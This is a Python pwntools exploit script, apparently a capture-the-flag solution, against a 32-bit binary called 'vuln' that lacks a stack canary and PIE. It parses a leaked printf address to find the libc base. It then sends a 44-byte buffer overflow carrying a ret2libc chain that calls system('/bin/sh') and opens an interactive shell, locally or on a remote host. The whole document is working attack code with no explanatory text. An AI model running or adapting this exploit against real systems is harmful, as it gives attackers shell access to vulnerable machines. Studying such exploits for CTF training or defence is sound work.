#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '8d5377e.678470.xyz', 31817

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x08049247
break *0x080492d5
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8047000)
# RUNPATH:  b'.'

def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    align = rop.find_gadget(["ret"])[0]

    io.recvuntil(b'... ')
    libc.address = int(io.recvline().strip(), 16) - libc.sym['printf']

    offset = 44
    payload = flat({
        offset: [
            align,
            libc.sym['system'],
            0x0,
            next(libc.search(b'/bin/sh\x00')),
        ]
    })
    io.sendline(payload)


    info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()